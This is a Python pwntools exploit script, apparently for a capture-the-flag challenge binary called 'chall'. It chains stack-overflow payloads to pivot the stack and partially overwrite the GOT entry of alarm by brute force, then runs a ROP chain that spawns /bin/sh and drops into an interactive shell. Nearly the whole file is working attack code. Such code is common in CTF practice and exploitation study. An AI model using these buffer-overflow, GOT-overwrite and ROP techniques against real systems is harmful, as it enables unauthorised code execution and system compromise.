#!/usr/bin/python3
from pwn import *
import time

# local libc, not yet test in docker libc because dont know how to use docker

'''
p = process("./chall")
gdb.attach(p, gdbscript = 
b *vuln + 43
)
'''

e = ELF("./chall")

alarm_plt = e.plt['alarm']
alarm_got = e.got['alarm']
pop_rdi = 0x0000000000401247
vuln_func = 0x0000000000401249
ret = pop_rdi + 1

while(True):
    try:
        p = process("./chall")
        payload = b"A" * 0x20 + p64(alarm_got + 0x20 + 0x20)
        payload += p64(vuln_func)
        payload = payload.ljust(0x48, b"B")
        p.send(payload)

        payload = (p64(0x404120) + p64(vuln_func) + b"A" * 0x10) + p64(alarm_got + 0x20)
        payload += p64(vuln_func)
        payload = payload.ljust(0x48, b"B")
        p.send(payload)

        payload = p8(0xf0) + p8(0x61)
        p.send(payload)

        payload = b"\x00" * 8 + b"/bin/sh\x00" + b"A" * 0x10 + p64(1)
        payload += p64(pop_rdi) + p64(0x404108) + p64(alarm_plt)
        payload = payload.ljust(0x48, b"B")
        time.sleep(3) # separate 2 input
        p.send(payload)

        p.sendline(b"echo vani5hing")
        p.recvuntil(b"vani5hing")
        break
    except:
        try:
            p.close()
        except:
            pass

p.interactive()